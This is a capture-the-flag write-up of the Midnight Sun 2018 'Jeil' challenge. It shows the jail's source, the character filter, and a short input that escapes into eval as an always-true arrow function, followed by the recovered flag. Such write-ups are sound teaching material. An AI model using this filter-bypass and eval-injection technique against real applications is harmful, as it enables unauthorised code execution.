---
title: "Midnight Sun 2018 - Jeil (Pwn)"
header:
  overlay_image: /assets/images/midnightsun2018/jeil/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Nicolai Berntsen on Unsplash"

tags:
  - midnightsun2018
  - writeup
  - pwn
---

Javascript jail challenge that filters most Javascript special symbols and
alphabets.

## Challenge Description

```
You are awesome at breaking into stuff, how about breaking out?

Service: nc web2.midnightsunctf.se 55542 | nc 34.244.177.217 55542
```

#### Points

Points: 200

Solves: 3

Author: avlidienbrunn

## Solution

We are given the following source code:

```js
var readline = require('readline');
var rl = readline.createInterface(process.stdin, process.stdout);

var Jail = (function() {
    var rv = {};

    function secretFuncUnguessable{{ENV_SECRET_0}}(a,b,c){
        if(a === '{{ENV_SECRET_1}}' && b === '{{ENV_SECRET_2}}' && c === '{{ENV_SECRET_3}}'){
            return true;
        }
    }

    function call(code) {
        var line = "";

        if(new RegExp(/[\[\]\.\\\+\-\/;a-zA-Z{}`'"\s]/).test(code)){
            console.log("Unrecognized code.");
            throw 123;
            return;
        }

        if(!(code.length == 32)){
            console.log("Incorrect code length.");
            throw 123;
            return;
        }

        arguments = undefined;

        ret = null;
        ret = eval("this.secretFuncUnguessable"+code);

        if(typeof ret == "function"){
            if(ret.call(this,'{{ENV_SECRET_1}}', '{{ENV_SECRET_2}}', '{{ENV_SECRET_3}}') === true){
                console.log("{{ENV_SECRET_FLAG}}");
            }else{
                console.log("Incorrect code.");
            }
        }else{
            console.log("Incorrect code.");
        }
        throw 123;
    };
    rv.call = call;
    rv.toString = function(){return rv.call.toString()};

    return rv;
})();

template = `|￣￣￣￣￣￣￣￣|
|    Internal    |
|＿＿＿＿＿＿＿＿|
       ||
(\\__/) ||
(•ㅅ•) ||
/ 　 づ

Code: `;

function ask(){
    rl.question(template,function(answer){
        Jail.call(answer);
    });
}

ask();
```

The program filters a lot of characters and we are left with the following to
work with:

```
['0',
'1',
'2',
'3',
'4',
'5',
'6',
'7',
'8',
'9',
'!',
'#',
'$',
'%',
'&',
'(',
')',
'*',
',',
':',
'<',
'=',
'>',
'?',
'@',
'^',
'_',
'|',
'~',
'\t',
'\n',
'\r',
'\x0b',
'\x0c']
```

The objective is to get the flag by passing these constraints:

```js
ret = eval("this.secretFuncUnguessable"+code);

        if(typeof ret == "function"){
            if(ret.call(this,'{{ENV_SECRET_1}}', '{{ENV_SECRET_2}}', '{{ENV_SECRET_3}}') === true){
                console.log("{{ENV_SECRET_FLAG}}");
            }else{
                console.log("Incorrect code.");
            }
        }else{
            console.log("Incorrect code.");
        }
```

The user input is concatenated with the base part of the unguessable function
name and then evaluated. Thus, we have to make the eval return a valid function
that also returns true when those parameters are passed to it.

We can create a test environment for ourselves to play with this:

```js
$ nodejs
> this.secretFunction12345 = function(a,b,c) {
... if (a == "1") return true;
... }
[Function]
> eval("this.secretFunction" + "")
undefined
>
```

To begin with, we need to be able to chain another command. We can do this
easily with `,`.

```js
> eval("this.secretFunction" + ",1")
1
```

Next, we need to create a function. Turns out, we can do this with the fat arrow
notation `=>`. I opted to use a unicode symbol as the variable name since it
was not filtered.

```js
> eval("this.secretFunction" + ",Ŝ=>1")
[Function]
```

Finally, we need that function to always return true. We can do this by using
`!0` to create that value.

```js
> !0
true
> eval("this.secretFunction" + ",Ŝ=>!0")
[Function]
> eval("this.secretFunction" + ",Ŝ=>!0")()
true
```

Now, all we need to do is pad it to the required length and then send it to the
server to get our flag.

```shell
nc 34.244.177.217 55542
|￣￣￣￣￣￣￣￣|
|    Internal    |
|＿＿＿＿＿＿＿＿|
       ||
(\__/) ||
(•ㅅ•) ||
/ 　 づ

Code: ,1111111111111111111111111,Ŝ=>!0
midnight{f33lin_fr1sky_f0r_funky_funct10nz}
```

Flag: **midnight{f33lin\_fr1sky\_f0r\_funky\_funct10nz}**

